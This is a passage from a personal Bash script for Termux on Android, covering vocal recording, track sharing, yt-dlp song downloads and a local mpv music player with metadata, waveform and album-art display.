        if ! command -v termux-microphone-record &>/dev/null; then
            printf "  ${RED}termux-microphone-record not found.${RESET}\n"
            printf "  ${YEL}Fix: pkg install termux-api  +  install Termux:API app${RESET}\n"
            printf "  ${FADE}Press ENTER...${RESET}"; read -r; return
        fi
        local rec_name="vocal_$(date +%Y%m%d_%H%M%S)"
        printf "  ${C29}File name (leave blank = %s): ${RESET}" "$rec_name"; read -r rn
        [[ -n "$rn" ]] && rec_name=$(echo "$rn" | tr ' /' '__' | tr -cd '[:alnum:]_-')
        local rec_file="$RECDIR/${rec_name}.m4a"
        echo ""
        printf "  ${WH}[1]${RESET}  ${C29}30 seconds${RESET}\n"
        printf "  ${WH}[2]${RESET}  ${C29}60 seconds${RESET}\n"
        printf "  ${WH}[3]${RESET}  ${C29}Custom duration (seconds)${RESET}\n"
        echo ""; printf "  ${C29}Duration » ${RESET}"; read -r rd
        local dur=30
        case "$rd" in
            1) dur=30 ;;
            2) dur=60 ;;
            3) printf "  ${C29}Seconds: ${RESET}"; read -r dur
               [[ ! "$dur" =~ ^[0-9]+$ ]] && dur=30 ;;
        esac
        echo ""
        printf "  ${GRN}● RECORDING for %d seconds → %s${RESET}\n" "$dur" "$rec_file"
        printf "  ${FADE}Stay quiet · press ENTER when done or wait for timer${RESET}\n\n"
        termux-microphone-record -l "$dur" -f "$rec_file" 2>/dev/null &
        local rec_pid=$!
        sleep "$dur"
        termux-microphone-record -q 2>/dev/null
        wait "$rec_pid" 2>/dev/null
        if [[ -f "$rec_file" ]]; then
            local sz; sz=$(du -sh "$rec_file" 2>/dev/null | cut -f1)
            printf "  ${GRN}✓ Saved: %s  (%s)${RESET}\n" "$rec_file" "$sz"
        else
            printf "  ${RED}Recording failed or file not saved.${RESET}\n"
        fi
        printf "  ${FADE}Press ENTER...${RESET}"; read -r
    }

    # ── share / export track ──────────────────────────────────────────
    _fa_share_track() {
        local -a afiles=()
        while IFS= read -r af; do afiles+=("$af"); done < <(
            find "$SAVEDIR" "$HOME/storage/downloads/fezzy_artist/recordings"                 -type f \( -iname "*.mp3" -o -iname "*.m4a" -o -iname "*.opus" -o -iname "*.wav" \)                 2>/dev/null | sort
        )
        if (( ${#afiles[@]} == 0 )); then
            printf "  ${FADE}No tracks found.${RESET}\n"
            printf "  ${FADE}Press ENTER...${RESET}"; read -r; return
        fi
        clear; echo ""
        _dv29
        printf "  ${C29}${BOLD}SHARE / EXPORT TRACK${RESET}\n"
        _dv29; echo ""
        for i in "${!afiles[@]}"; do
            printf "  ${C29}%3d.${RESET}  ${WH}%s${RESET}\n" "$((i+1))" "$(basename "${afiles[$i]}")"
        done
        echo ""; _dv29
        printf "  ${FADE}[B] Back${RESET}\n\n"
        printf "  ${C29}Number or B » ${RESET}"; read -r si
        [[ "$si" == "B" || "$si" == "b" ]] && return
        if [[ "$si" =~ ^[0-9]+$ ]] && (( si >= 1 && si <= ${#afiles[@]} )); then
            local picked="${afiles[$((si-1))]}"
            echo ""
            printf "  ${WH}[1]${RESET}  ${C29}Share via Termux API${RESET}   ${FADE}→ Android share sheet${RESET}\n"
            printf "  ${WH}[2]${RESET}  ${C29}Copy path to clipboard${RESET} ${FADE}→ paste anywhere${RESET}\n"
            printf "  ${WH}[3]${RESET}  ${C29}Show file info${RESET}         ${FADE}→ size · format · path${RESET}\n"
            echo ""; printf "  ${C29}Choice » ${RESET}"; read -r sh_c
            case "$sh_c" in
                1) termux-share "$picked" 2>/dev/null || printf "  ${RED}termux-share unavailable. Install Termux:API${RESET}\n"
                   printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                2) echo -n "$picked" | termux-clipboard-set 2>/dev/null
                   printf "  ${GRN}✓ Path copied to clipboard${RESET}\n"
                   printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                3)
                    local sz; sz=$(du -sh "$picked" 2>/dev/null | cut -f1)
                    printf "  ${WH}File:${RESET}  %s\n" "$(basename "$picked")"
                    printf "  ${WH}Path:${RESET}  %s\n" "$picked"
                    printf "  ${WH}Size:${RESET}  %s\n" "$sz"
                    if command -v ffprobe &>/dev/null; then
                        echo ""
                        ffprobe -v quiet -print_format compact -show_format "$picked" 2>&1 | grep -E "bit_rate|duration|format_name" | head -5
                    fi
                    printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            esac
        fi
    }

    # ── download influence track ─────────────────────────────────────
    _fa_influence_dl() {
        local -a inf_names=(
            "Lil Uzi Vert - Back to the Moon"
            "Juice WRLD - Maze"
            "Future & Lil Uzi Vert - Over Your Head"
            "NAV - Back to Business"
            "Juicy J - Cell Ready"
            "Wiz Khalifa - Paperbond"
            "Wiz Khalifa - Kush and Orange Juice"
            "Machine Gun Kelly - Tickets to My Downfall"
            "Machine Gun Kelly - Mainstream Sellout"
        )
        clear; echo ""
        _dv29
        printf "  ${C29}${BOLD}DOWNLOAD INFLUENCE TRACK${RESET}\n"
        _dv29; echo ""
        for i in "${!inf_names[@]}"; do
            printf "  ${WH}[%d]${RESET}  ${C29}%s${RESET}\n" "$((i+1))" "${inf_names[$i]}"
        done
        echo ""; _dv29
        printf "  ${FADE}[B] Back${RESET}\n\n"
        printf "  ${C29}Choice » ${RESET}"; read -r ic

        if [[ "$ic" =~ ^[0-9]+$ ]] && (( ic >= 1 && ic <= ${#inf_names[@]} )); then
            local track="${inf_names[$((ic-1))]}"
            local enc; enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$track" 2>/dev/null || echo "$track")
            local yt_search="https://www.youtube.com/results?search_query=${enc}"
            echo ""
            printf "  ${YEL}Searching YouTube for:${RESET} ${WH}%s${RESET}\n\n" "$track"
            printf "  ${WH}[1]${RESET} Download via yt-dlp (audio only)\n"
            printf "  ${WH}[2]${RESET} Download via yt-dlp (video + audio)\n"
            printf "  ${WH}[3]${RESET} Open search in w3m\n"
            echo ""; printf "  ${C29}Choice » ${RESET}"; read -r ia
            case "$ia" in
                1)
                    echo ""
                    yt-dlp --no-warnings -x --audio-format mp3 \
                        -o "$SAVEDIR/%(title)s.%(ext)s" \
                        "ytsearch1:${track}" 2>&1 | tail -20
                    printf "  ${GRN}✓ Saved to %s${RESET}\n" "$SAVEDIR"
                    printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                2)
                    echo ""
                    yt-dlp --no-warnings \
                        -o "$SAVEDIR/%(title)s.%(ext)s" \
                        "ytsearch1:${track}" 2>&1 | tail -20
                    printf "  ${GRN}✓ Saved to %s${RESET}\n" "$SAVEDIR"
                    printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                3) w3m "$yt_search" 2>/dev/null; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            esac
        fi
    }

    # ── MAIN LOOP ────────────────────────────────────────────────────
    while true; do
        _fa_banner
        printf "  ${WH}[1]${RESET}  ${C29}YouTube${RESET}                  ${FADE}→ @grantfesters · vlogs · tracks${RESET}\n"
        printf "  ${WH}[2]${RESET}  ${C29}SoundCloud${RESET}               ${FADE}→ hiphopfezzy · full catalogue${RESET}\n"
        printf "  ${WH}[3]${RESET}  ${C29}Audiomack${RESET}                ${FADE}→ f3zzy · stream + download${RESET}\n"
        printf "  ${WH}[4]${RESET}  ${C29}ReverbNation${RESET}             ${FADE}→ FezzyFesters · songs + bio${RESET}\n"
        printf "  ${WH}[5]${RESET}  ${C29}Download influence track${RESET} ${FADE}→ pull from your influence list${RESET}\n"
        printf "  ${WH}[6]${RESET}  ${C29}Play local files${RESET}         ${FADE}→ mpv · shuffle · pick track${RESET}\n"
        printf "  ${WH}[7]${RESET}  ${C29}Paste any URL${RESET}            ${FADE}→ direct yt-dlp pull${RESET}\n"
        printf "  ${WH}[8]${RESET}  ${C29}Lyrics finder${RESET}            ${FADE}→ find · save · reverse search${RESET}\n"
        printf "  ${WH}[9]${RESET}  ${C29}Lyric Notepad${RESET}            ${FADE}→ write · edit · search · export bars${RESET}\n"
        printf "  ${WH}[10]${RESET} ${C29}Record vocals${RESET}            ${FADE}→ mic capture → .m4a file${RESET}\n"
        printf "  ${WH}[11]${RESET} ${C29}Share / export track${RESET}     ${FADE}→ Android share · path · info${RESET}\n"
        echo ""
        _dv29
        printf "  ${FADE}[B] Back${RESET}\n\n"
        printf "  ${C29}${BOLD}Choice » ${RESET}"; read -r mc

        case "$mc" in
            1) _fa_site "YOUTUBE · @grantfesters"      "$URL_YT" "${RED}"  ;;
            2) _fa_site "SOUNDCLOUD · hiphopfezzy"     "$URL_SC" "${HOT}"  ;;
            3) _fa_site "AUDIOMACK · f3zzy"            "$URL_AM" "${YEL}"  ;;
            4) _fa_site "REVERBNATION · FezzyFesters"  "$URL_RN" "${GRN}"  ;;
            5) _fa_influence_dl ;;
            6) _fa_play_local ;;
            7)
                echo ""
                printf "  ${C29}Paste URL: ${RESET}"; read -r purl
                [[ -n "$purl" ]] && _fa_dl "$purl" "direct" ;;
            8) _fa_lyrics_finder ;;
            9) _fa_lyric_notepad ;;
            10) _fa_record_vocals ;;
            11) _fa_share_track ;;
            B|b) _finish_msg fezzyartist; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.6 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [30] LOCAL MUSIC PLAYER PORTAL
# ═══════════════════════════════════════════════════════════════════

music_player_portal() {
    local PLDIR="$HOME/storage/downloads/playlists"
    mkdir -p "$PLDIR" 2>/dev/null

    # ── all music folders scanned ────────────────────────────────────
    local -a SCAN_DIRS=(
        "$HOME/storage/downloads/FezzyStation"
        "/sdcard/Download/FezzyStation"
        "/storage/emulated/0/Download/FezzyStation"
        "$HOME/storage/downloads"
        "/sdcard/Download"
        "$HOME/storage/downloads/music"
        "$HOME/storage/downloads/Music"
        "/storage/emulated/0/Music"
        "/storage/emulated/0/Download/music"
        "/storage/emulated/0/Download/Music"
        "/storage/emulated/0/MyDocuments/MUSIC"
        "$HOME/storage/downloads/fezzy_artist"
        "$HOME/storage/downloads/fezzy_artist/recordings"
    )

    # ── collect all tracks from all folders recursively ──────────────
    _mp_scan() {
        local _cache="${TMPDIR:-/tmp}/fezzy_mp_cache_$UID.txt"
        local _cache_age=999
        if [[ -f "$_cache" ]]; then
            _cache_age=$(( $(date +%s) - $(stat -c %Y "$_cache" 2>/dev/null || echo 0) ))
        fi
        # Use cache if under 5 minutes old
        if [[ -f "$_cache" && $_cache_age -lt 300 ]]; then
            mapfile -t _MP_FILES < "$_cache"
            return
        fi
        # Broad dirs (Downloads root) use maxdepth 1 to avoid scanning 800+ files
        # Deep dirs (music-specific) use maxdepth 3
        local _broad=(
            "/sdcard/Download"
            "/storage/emulated/0/Download"
        )
        local _deep=(
            "$HOME/storage/downloads/FezzyStation"
            "/sdcard/Download/FezzyStation"
            "/storage/emulated/0/Download/FezzyStation"
            "$HOME/storage/downloads/music"
            "$HOME/storage/downloads/Music"
            "/storage/emulated/0/Music"
            "/storage/emulated/0/Download/music"
            "/storage/emulated/0/Download/Music"
            "/storage/emulated/0/MyDocuments/MUSIC"
            "$HOME/storage/downloads/fezzy_artist"
            "$HOME/storage/downloads/fezzy_artist/recordings"
        )
        mapfile -t _MP_FILES < <(
            {
                for d in "${_broad[@]}"; do
                    [[ -d "$d" ]] && find "$d" -maxdepth 1 -type f \( \
                        -iname "*.mp3" -o -iname "*.flac" -o \
                        -iname "*.ogg" -o -iname "*.wav"  -o \
                        -iname "*.m4a" -o -iname "*.opus" -o \
                        -iname "*.webm" \) 2>/dev/null
                done
                for d in "${_deep[@]}"; do
                    [[ -d "$d" ]] && find "$d" -maxdepth 3 -type f \( \
                        -iname "*.mp3" -o -iname "*.flac" -o \
                        -iname "*.ogg" -o -iname "*.wav"  -o \
                        -iname "*.m4a" -o -iname "*.opus" -o \
                        -iname "*.webm" \) 2>/dev/null
                done
            } | sort -u
        )
        # Write cache
        printf '%s\n' "${_MP_FILES[@]}" > "$_cache" 2>/dev/null
    }

    _mp_count() {
        local total
        total=$(for d in "${SCAN_DIRS[@]}"; do
            [[ -d "$d" ]] && find "$d" -maxdepth 3 -type f \( \
                -iname "*.mp3" -o -iname "*.flac" -o \
                -iname "*.ogg" -o -iname "*.wav"  -o \
                -iname "*.m4a" -o -iname "*.opus" \) -printf "%f\n" 2>/dev/null
        done | sort -u | wc -l)
        echo "${total:-0}"
    }

    _mp_check() {
        if ! command -v mpv &>/dev/null; then
            printf "  ${YEL}mpv not found — installing...${RESET}\n"
            pkg install mpv -y
        fi
    }

    # ── Bojack's Dark Wisdom for when Fezzy needs it ────────────────
    _bojack_wisdom() {
        local quotes=(
            "It gets easier. But you gotta do it every day — that's the hard part."
            "You can't keep doing shitty things and feel bad about yourself like that makes it okay."
            "Sometimes life's a bitch and then you keep living."
            "The universe is a cruel, uncaring void. The key to being happy isn't the search for meaning; it's just to keep yourself busy with unimportant nonsense."
            "I need you to tell me I'm a good person. I know that I can be selfish and narcissistic and self-destructive, but underneath all that, deep down, I'm a good person."
            "Every day it gets a little easier. But you gotta do it every day."
            "When you look at someone through rose-colored glasses, all the red flags just look like flags."
            "There is no other side. This is it."
            "You know what your problem is? You want to think of yourself as the good guy."
            "Closure is a made up thing by Steven Spielberg to sell movie tickets."
            "I think there are people who help you become the person you end up being, and you can be grateful for them even if they were never meant to be in your life forever."
            "Life's a bitch and then you die, right? Sometimes life's a bitch and then you keep living."
        )
        local idx=$((RANDOM % ${#quotes[@]}))
        printf "  ${FADE}╭──────────────────────────────────────────────────────────────╮${RESET}\n"
        printf "  ${FADE}│ ${C30}Bojack says:${RESET} %-48s ${FADE}│${RESET}\n" "${quotes[$idx]:0:48}"
        if [[ ${#quotes[$idx]} -gt 48 ]]; then
            printf "  ${FADE}│              %-48s │${RESET}\n" "${quotes[$idx]:48:48}"
        fi
        if [[ ${#quotes[$idx]} -gt 96 ]]; then
            printf "  ${FADE}│              %-48s │${RESET}\n" "${quotes[$idx]:96:48}"
        fi
        printf "  ${FADE}╰──────────────────────────────────────────────────────────────╯${RESET}\n"
    }

    # ── Generate waveform visualization ──────────────────────────────
    _mp_generate_waveform() {
        local infile="$1"
        local outfile="${TMPDIR:-/tmp}/fezzy_waveform_$$.png"
        
        if ! command -v ffmpeg &>/dev/null; then
            return 1
        fi
        
        # Generate waveform image (640x120px - terminal friendly)
        ffmpeg -i "$infile" -filter_complex \
            "showwavespic=s=640x120:colors=#ff3ea5|#00f5ff:scale=lin" \
            -frames:v 1 -y "$outfile" 2>/dev/null
        
        if [[ -f "$outfile" ]]; then
            echo "$outfile"
            return 0
        fi
        return 1
    }

    # ── Extract and display album art ────────────────────────────────
    _mp_extract_art() {
        local infile="$1"
        local artfile="${TMPDIR:-/tmp}/fezzy_cover_$$.jpg"
        
        if ! command -v ffmpeg &>/dev/null; then
            return 1
        fi
        
        # Extract embedded album art
        ffmpeg -i "$infile" -an -vcodec copy "$artfile" 2>/dev/null
        
        if [[ -f "$artfile" && -s "$artfile" ]]; then
            echo "$artfile"
            return 0
        fi
        rm -f "$artfile" 2>/dev/null
        return 1
    }

    # ── Display image as ASCII art ───────────────────────────────────
    _mp_show_ascii_art() {
        local imgfile="$1"
        local width="${2:-40}"
        
        # Try img2txt (from libcaca) first
        if command -v img2txt &>/dev/null; then
            img2txt -W "$width" -f utf8 "$imgfile" 2>/dev/null
            return 0
        fi
        
        # Try jp2a as fallback
        if command -v jp2a &>/dev/null; then
            jp2a --width="$width" "$imgfile" 2>/dev/null
            return 0
        fi
        
        # No ASCII converter available
        return 1
    }

    # ── Enhanced metadata extraction ─────────────────────────────────
    _mp_extract_full_meta() {
        local cur_file="$1"
        
        if ! command -v ffprobe &>/dev/null; then
            return 1
        fi
        
        local meta; meta=$(ffprobe -v quiet -print_format json -show_format -show_streams "$cur_file" 2>/dev/null)
        
        # Tags
        local artist title album genre date bitrate duration track_num disc_num
        local composer comment encoder sample_rate channels codec
        
        artist=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('format',{}).get('tags',{}); print(t.get('artist',t.get('ARTIST','')))" 2>/dev/null)
        title=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('format',{}).get('tags',{}); print(t.get('title',t.get('TITLE','')))" 2>/dev/null)
        album=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('format',{}).get('tags',{}); print(t.get('album',t.get('ALBUM','')))" 2>/dev/null)
        genre=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('format',{}).get('tags',{}); print(t.get('genre',t.get('GENRE','')))" 2>/dev/null)
        date=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('format',{}).get('tags',{}); print(t.get('date',t.get('DATE','')))" 2>/dev/null)
        composer=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('format',{}).get('tags',{}); print(t.get('composer',t.get('COMPOSER','')))" 2>/dev/null)
        comment=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('format',{}).get('tags',{}); print(t.get('comment',t.get('COMMENT','')))" 2>/dev/null)
        track_num=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('format',{}).get('tags',{}); print(t.get('track',t.get('TRACK','')))" 2>/dev/null)
        disc_num=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('format',{}).get('tags',{}); print(t.get('disc',t.get('DISC','')))" 2>/dev/null)
        encoder=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('format',{}).get('tags',{}); print(t.get('encoder',t.get('ENCODER','')))" 2>/dev/null)
        
        # Format info
        bitrate=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); br=d.get('format',{}).get('bit_rate',''); print(str(int(br)//1000)+'kbps' if br else '')" 2>/dev/null)
        duration=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); s=d.get('format',{}).get('duration',''); print('%d:%02d'%(int(float(s))//60,int(float(s))%60) if s else '')" 2>/dev/null)
        local fmtname; fmtname=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('format',{}).get('format_long_name',''))" 2>/dev/null)
        
        # Stream info
        sample_rate=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); s=d.get('streams',[{}])[0]; sr=s.get('sample_rate',''); print(str(int(sr)//1000)+'kHz' if sr else '')" 2>/dev/null)
        channels=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); s=d.get('streams',[{}])[0]; ch=s.get('channels',''); print(str(ch)+' ch' if ch else '')" 2>/dev/null)
        codec=$(echo "$meta" | python3 -c "import sys,json; d=json.load(sys.stdin); s=d.get('streams',[{}])[0]; print(s.get('codec_long_name',''))" 2>/dev/null)
        
        # Export as associative array keys
        declare -gA _MP_META=(
            [artist]="$artist"
            [title]="$title"
            [album]="$album"
            [genre]="$genre"
            [year]="$date"
            [composer]="$composer"
            [comment]="$comment"
            [track]="$track_num"
            [disc]="$disc_num"
            [encoder]="$encoder"
            [bitrate]="$bitrate"
            [duration]="$duration"
            [format]="$fmtname"
            [sample_rate]="$sample_rate"
            [channels]="$channels"
            [codec]="$codec"
        )
    }

    # ── write temp playlist and play from index ──────────────────────
    _mp_play_from() {
        local start_idx="${1:-0}"
        local shuffle="${2:-no}"
        local tmppl="${TMPDIR:-/tmp}/fezzy_mp_$$.m3u"
        printf "#EXTM3U\n" > "$tmppl"
        for f in "${_MP_FILES[@]}"; do echo "$f"; done >> "$tmppl"
        if [[ "$shuffle" == "yes" ]]; then
            mpv --no-video --shuffle --playlist="$tmppl" 2>/dev/null
        else
            mpv --no-video --playlist="$tmppl" --playlist-start="$start_idx" 2>/dev/null
        fi
        rm -f "$tmppl"
    }

    # ── browse list with paging — ENHANCED WITH WAVEFORMS + ALBUM ART ───
    _mp_browse() {
        _mp_scan
        local total=${#_MP_FILES[@]}
        if (( total == 0 )); then
            printf "  ${RED}No tracks found across all folders.${RESET}\n"
            printf "  ${FADE}Press ENTER...${RESET}"; read -r; return
        fi
        local page=0 per=20
        while true; do
            clear; echo ""
            _dv30
            printf "  ${C30}${BOLD}BROWSE TRACKS  ·  %d total  ·  ENHANCED PLAYER${RESET}\n" "$total"
            _dv30; echo ""
            local start=$(( page * per ))
            local end=$(( start + per ))
            (( end > total )) && end=$total
            for (( i=start; i<end; i++ )); do
                printf "  ${C30}%3d.${RESET}  ${WH}%s${RESET}  ${FADE}[%s]${RESET}\n" \
                    "$((i+1))" \
                    "$(basename "${_MP_FILES[$i]}")" \
                    "$(basename "$(dirname "${_MP_FILES[$i]}")")"
            done
            echo ""; _dv30
            local pages=$(( (total + per - 1) / per ))
            printf "  ${FADE}Page %d/%d  ·  [N] Next  [P] Prev  [B] Back${RESET}\n" \
                "$((page+1))" "$pages"
            echo ""
            printf "  ${C30}Pick number or N/P/B » ${RESET}"; read -r bc
            case "$bc" in
                N|n) (( page < pages-1 )) && (( page++ )) ;;
                P|p) (( page > 0 ))       && (( page-- )) ;;
                B|b) return ;;
                *)
                    if [[ "$bc" =~ ^[0-9]+$ ]] && (( bc >= 1 && bc <= total )); then
                        _mp_check
                        local idx=$(( bc - 1 ))
                        local cur_idx="$idx"
                        while true; do
                            local cur_file="${_MP_FILES[$cur_idx]}"
                            clear; echo ""
                            
                            # Show Bojack wisdom for emotional support
                            _bojack_wisdom
                            echo ""
                            
                            _dv30
                            printf "  ${C30}${BOLD}NOW PLAYING  ·  TRACK %d OF %d${RESET}\n" "$((cur_idx+1))" "$total"
                            _dv30; echo ""
                            
                            # File info
                            printf "  ${WH}File:${RESET}   %s\n" "$(basename "$cur_file")"
                            printf "  ${FADE}Path:   %s${RESET}\n" "$cur_file"
                            local fsize; fsize=$(du -h "$cur_file" 2>/dev/null | cut -f1)
                            [[ -n "$fsize" ]] && printf "  ${FADE}Size:   %s${RESET}\n" "$fsize"
                            echo ""
                            
                            # Extract full metadata
                            _mp_extract_full_meta "$cur_file"
                            
                            # Display metadata in two columns
                            printf "  ${C30}╭──── TRACK INFORMATION ──────────────────────────────────╮${RESET}\n"
                            [[ -n "${_MP_META[title]}" ]]    && printf "  ${C30}│${RESET} ${YEL}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Title:" "${_MP_META[title]:0:40}"
                            [[ -n "${_MP_META[artist]}" ]]   && printf "  ${C30}│${RESET} ${YEL}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Artist:" "${_MP_META[artist]:0:40}"
                            [[ -n "${_MP_META[album]}" ]]    && printf "  ${C30}│${RESET} ${YEL}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Album:" "${_MP_META[album]:0:40}"
                            [[ -n "${_MP_META[composer]}" ]] && printf "  ${C30}│${RESET} ${YEL}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Composer:" "${_MP_META[composer]:0:40}"
                            [[ -n "${_MP_META[genre]}" ]]    && printf "  ${C30}│${RESET} ${FADE}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Genre:" "${_MP_META[genre]:0:40}"
                            [[ -n "${_MP_META[year]}" ]]     && printf "  ${C30}│${RESET} ${FADE}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Year:" "${_MP_META[year]:0:40}"
                            [[ -n "${_MP_META[track]}" ]]    && printf "  ${C30}│${RESET} ${FADE}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Track #:" "${_MP_META[track]:0:40}"
                            [[ -n "${_MP_META[disc]}" ]]     && printf "  ${C30}│${RESET} ${FADE}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Disc #:" "${_MP_META[disc]:0:40}"
                            printf "  ${C30}├──── AUDIO QUALITY ──────────────────────────────────────┤${RESET}\n"
                            [[ -n "${_MP_META[duration]}" ]]     && printf "  ${C30}│${RESET} ${YEL}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Duration:" "${_MP_META[duration]}"
                            [[ -n "${_MP_META[bitrate]}" ]]      && printf "  ${C30}│${RESET} ${YEL}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Bitrate:" "${_MP_META[bitrate]}"
                            [[ -n "${_MP_META[sample_rate]}" ]]  && printf "  ${C30}│${RESET} ${FADE}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Sample Rate:" "${_MP_META[sample_rate]}"
                            [[ -n "${_MP_META[channels]}" ]]     && printf "  ${C30}│${RESET} ${FADE}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Channels:" "${_MP_META[channels]}"
                            [[ -n "${_MP_META[codec]}" ]]        && printf "  ${C30}│${RESET} ${FADE}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Codec:" "${_MP_META[codec]:0:40}"
                            [[ -n "${_MP_META[encoder]}" ]]      && printf "  ${C30}│${RESET} ${FADE}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Encoder:" "${_MP_META[encoder]:0:40}"
                            printf "  ${C30}╰──────────────────────────────────────────────────────────╯${RESET}\n"
                            echo ""
                            
                            # Try to extract and display album art
                            local artfile
                            artfile=$(_mp_extract_art "$cur_file")
                            if [[ -n "$artfile" ]]; then
                                printf "  ${C30}╭──── ALBUM ART ───────────────────────────────────────────╮${RESET}\n"
                                if _mp_show_ascii_art "$artfile" 56 | head -15 | sed 's/^/  │ /'; then
                                    printf "  ${C30}│${RESET} ${FADE}(ASCII conversion - install img2txt/jp2a for better)${RESET}   ${C30}│${RESET}\n"
                                else
                                    printf "  ${C30}│${RESET} ${FADE}Album art extracted: %s${RESET}\n" "$(basename "$artfile")"
                                    printf "  ${C30}│${RESET} ${FADE}View with: termux-open '%s'${RESET}\n" "$artfile"
                                fi
                                printf "  ${C30}╰──────────────────────────────────────────────────────────╯${RESET}\n"
                                echo ""
                            fi
                            
                            # Try to generate waveform
                            printf "  ${FADE}⚡ Generating waveform visualization...${RESET}\n"
                            local wavefile
                            wavefile=$(_mp_generate_waveform "$cur_file")
                            if [[ -n "$wavefile" ]]; then
                                printf "  ${GRN}✓ Waveform saved: %s${RESET}\n" "$wavefile"
                                printf "  ${FADE}  View with: termux-open '%s'${RESET}\n" "$wavefile"
                            else
                                printf "  ${FADE}  (waveform generation requires ffmpeg)${RESET}\n"
                            fi
                            echo ""
                            
                            _dv30
                            printf "  ${FADE}MPV KEYS:  Space=pause  ←/→=seek  [/]=volume  9/0=vol  Q=quit${RESET}\n"
                            printf "  ${FADE}           </>  skip track   m=mute   s=screenshot${RESET}\n"
                            _dv30; echo ""
                            printf "  ${C30}▶ Starting playback...${RESET}\n\n"
                            mpv --no-video "$cur_file" 2>/dev/null
                            echo ""
                            
                            # Clean up temp files
                            [[ -n "$wavefile" ]] && rm -f "$wavefile" 2>/dev/null
                            [[ -n "$artfile" ]] && rm -f "$artfile" 2>/dev/null
                            
                            _dv30
                            printf "  ${C30}${BOLD}PLAYBACK ENDED  ·  WHAT NEXT?${RESET}\n"
                            _dv30; echo ""
                            printf "  ${WH}[N]${RESET}  ${C30}Next track${RESET}      ${FADE}→ %s${RESET}\n" "$(basename "${_MP_FILES[$(( (cur_idx+1) % total ))]}" 2>/dev/null)"
                            printf "  ${WH}[P]${RESET}  ${C30}Previous track${RESET}  ${FADE}→ %s${RESET}\n" "$(basename "${_MP_FILES[$(( (cur_idx-1+total) % total ))]}" 2>/dev/null)"
                            printf "  ${WH}[R]${RESET}  ${C30}Replay this track${RESET}\n"
                            printf "  ${WH}[W]${RESET}  ${C30}View waveform${RESET}   ${FADE}→ regenerate and open${RESET}\n"
                            printf "  ${WH}[A]${RESET}  ${C30}View album art${RESET}  ${FADE}→ extract and open${RESET}\n"
                            printf "  ${WH}[L]${RESET}  ${C30}Fetch lyrics${RESET}    ${FADE}→ lyrics.ovh API${RESET}\n"
                            printf "  ${WH}[I]${RESET}  ${C30}Raw track info${RESET}  ${FADE}→ full ffprobe dump${RESET}\n"
                            printf "  ${WH}[M]${RESET}  ${C30}Back to browse menu${RESET}\n"
                            printf "  ${WH}[Q]${RESET}  ${C30}Quit player${RESET}\n"
                            echo ""; _dv30; echo ""
                            printf "  ${C30}${BOLD}Choice » ${RESET}"; read -r pn
                            case "${pn^^}" in
                                N) (( cur_idx++ )); (( cur_idx >= total )) && cur_idx=0 ;;
                                P) (( cur_idx-- )); (( cur_idx < 0 )) && cur_idx=$(( total - 1 )) ;;
                                R) ;;  # replay — loop reruns mpv on same idx
                                W)
                                    echo ""
                                    printf "  ${C30}⚡ Generating waveform...${RESET}\n"
                                    local wf; wf=$(_mp_generate_waveform "$cur_file")
                                    if [[ -n "$wf" ]]; then
                                        printf "  ${GRN}✓ Done: %s${RESET}\n" "$wf"
                                        if command -v termux-open &>/dev/null; then
                                            termux-open "$wf" 2>/dev/null
                                        fi
                                    else
                                        printf "  ${RED}Failed — ensure ffmpeg is installed${RESET}\n"
                                    fi
                                    printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                                A)
                                    echo ""
                                    printf "  ${C30}📀 Extracting album art...${RESET}\n"
                                    local af; af=$(_mp_extract_art "$cur_file")
                                    if [[ -n "$af" ]]; then
                                        printf "  ${GRN}✓ Done: %s${RESET}\n" "$af"
                                        if command -v termux-open &>/dev/null; then
                                            termux-open "$af" 2>/dev/null
                                        fi
                                    else
                                        printf "  ${RED}No embedded art found${RESET}\n"
                                    fi
                                    printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                                L)
                                    echo ""
                                    local lart="${_MP_META[artist]}"
